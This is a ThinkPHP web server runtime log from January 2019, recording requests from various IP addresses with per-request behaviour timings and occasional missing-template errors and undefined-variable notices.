INFO: [ view_parse ] --END-- [ RunTime:0.011898s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000185s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000429s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000686s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000373s ]
INFO: [ app_end ] --END-- [ RunTime:0.000409s ]

[ 2019-01-30T04:53:53+08:00 ] 123.151.144.37 /999tst999index.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000048s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000329s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000384s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000776s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000824s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000867s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T05:06:43+08:00 ] 123.151.144.37 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000531s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000491s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001116s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001442s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001554s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000058s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000115s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011988s ]
INFO: [ view_parse ] --END-- [ RunTime:0.012040s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000162s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000336s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000556s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000354s ]
INFO: [ app_end ] --END-- [ RunTime:0.000383s ]

[ 2019-01-30T05:06:43+08:00 ] 123.151.144.37 /999tst999
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000319s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000328s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000728s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000827s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000923s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T05:11:50+08:00 ] 123.151.144.37 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000046s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000304s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000355s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000722s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000793s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000839s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000067s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000119s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009661s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009706s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000134s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000329s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000515s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000329s ]
INFO: [ app_end ] --END-- [ RunTime:0.000360s ]

[ 2019-01-30T05:11:50+08:00 ] 123.151.144.37 /999tst999
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000468s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000395s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000955s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001154s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001222s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T07:53:22+08:00 ] 168.232.13.206 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000216s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001563s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.003897s ]
INFO: [ app_begin ] --END-- [ RunTime:0.005608s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.010622s ]
INFO: [ action_begin ] --END-- [ RunTime:0.010694s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000091s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000200s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.041627s ]
INFO: [ view_parse ] --END-- [ RunTime:0.041768s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001471s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.001347s ]
INFO: [ view_filter ] --END-- [ RunTime:0.002941s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001368s ]
INFO: [ app_end ] --END-- [ RunTime:0.001416s ]

[ 2019-01-30T08:00:11+08:00 ] 186.3.252.3 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000095s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000575s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000496s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001160s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000979s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001030s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000092s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000183s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011309s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011369s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000151s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000328s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000532s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000362s ]
INFO: [ app_end ] --END-- [ RunTime:0.000392s ]

[ 2019-01-30T08:32:35+08:00 ] 71.6.232.4 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000103s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000479s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000500s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001060s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001067s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001121s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000079s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000146s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.014171s ]
INFO: [ view_parse ] --END-- [ RunTime:0.014240s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000185s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000418s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000671s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000507s ]
INFO: [ app_end ] --END-- [ RunTime:0.000550s ]

[ 2019-01-30T09:08:38+08:00 ] 139.162.119.197 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000317s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000336s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000708s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000886s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000946s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000075s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000135s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.012541s ]
INFO: [ view_parse ] --END-- [ RunTime:0.012595s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000125s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000298s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000469s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000377s ]
INFO: [ app_end ] --END-- [ RunTime:0.000426s ]

[ 2019-01-30T09:22:57+08:00 ] 5.22.196.255 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000541s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000660s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001326s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001124s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001224s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000060s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000115s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011902s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011974s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000132s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000308s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000488s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000469s ]
INFO: [ app_end ] --END-- [ RunTime:0.000514s ]

[ 2019-01-30T09:23:06+08:00 ] 5.22.196.255 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000338s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000341s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000743s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000818s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000863s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000077s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000130s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010041s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010090s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000121s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000332s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000501s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000347s ]
INFO: [ app_end ] --END-- [ RunTime:0.000376s ]

[ 2019-01-30T09:23:18+08:00 ] 5.22.196.255 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000303s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000308s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000681s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000752s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000791s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000059s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000135s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011303s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011353s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000123s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000344s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000519s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000393s ]
INFO: [ app_end ] --END-- [ RunTime:0.000429s ]

[ 2019-01-30T09:39:54+08:00 ] 101.226.79.190 /999tst999
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000333s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000396s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000792s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000927s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001000s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T09:47:50+08:00 ] 14.17.3.65 /index.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000349s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000467s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000884s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000979s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001030s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000066s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000129s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011494s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011572s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000180s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000466s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000757s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000399s ]
INFO: [ app_end ] --END-- [ RunTime:0.000432s ]

[ 2019-01-30T09:54:03+08:00 ] 5.3.152.161 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000028s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000330s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000404s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000814s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000826s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000871s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000057s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000118s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011919s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011971s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000136s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000435s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000630s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000350s ]
INFO: [ app_end ] --END-- [ RunTime:0.000383s ]

[ 2019-01-30T09:59:50+08:00 ] 201.182.216.98 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000502s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000366s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000937s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000933s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000980s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000063s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000121s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011643s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011702s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000123s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000365s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000539s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000371s ]
INFO: [ app_end ] --END-- [ RunTime:0.000401s ]

[ 2019-01-30T11:04:50+08:00 ] 37.9.113.114 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000422s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000371s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000894s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000959s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001009s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T11:04:54+08:00 ] 37.9.113.114 /Home_Index_agentLogin.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000375s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000321s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000756s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000796s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000835s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000039s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000088s ]
NOTIC: [8] Undefined variable: siteurl /www/wwwroot/94.191.18.151/Runtime/Cache/Home/cd35aea03897e50c6bffa1dde5605d6c.php 第 15 行.
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010986s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011036s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000176s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000314s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000539s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000374s ]
INFO: [ app_end ] --END-- [ RunTime:0.000403s ]

[ 2019-01-30T11:56:04+08:00 ] 177.52.44.8 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000466s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000401s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000965s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000828s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000868s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000057s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000108s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.013080s ]
INFO: [ view_parse ] --END-- [ RunTime:0.013127s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000120s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000441s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000632s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000372s ]
INFO: [ app_end ] --END-- [ RunTime:0.000403s ]

[ 2019-01-30T12:23:14+08:00 ] 58.251.121.185 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000382s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000387s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000822s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000888s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000933s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000057s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000110s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010036s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010089s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000122s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000312s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000482s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000345s ]
INFO: [ app_end ] --END-- [ RunTime:0.000374s ]

[ 2019-01-30T13:35:01+08:00 ] 179.111.74.130 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000424s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000336s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000826s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000946s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000983s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000055s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000103s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010547s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010589s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000113s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000323s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000509s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000343s ]
INFO: [ app_end ] --END-- [ RunTime:0.000373s ]

[ 2019-01-30T14:24:08+08:00 ] 177.190.176.99 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000328s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000308s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000691s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001033s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001088s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000050s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000100s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011120s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011187s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000168s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000423s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000641s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000699s ]
INFO: [ app_end ] --END-- [ RunTime:0.000756s ]

[ 2019-01-30T14:43:06+08:00 ] 2.184.178.66 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000356s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000295s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000711s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000842s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000878s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000078s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000139s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009672s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009714s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000118s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000287s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000450s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000327s ]
INFO: [ app_end ] --END-- [ RunTime:0.000502s ]

[ 2019-01-30T14:51:23+08:00 ] 177.138.178.115 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000386s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000364s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000811s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000862s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000910s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000054s ]
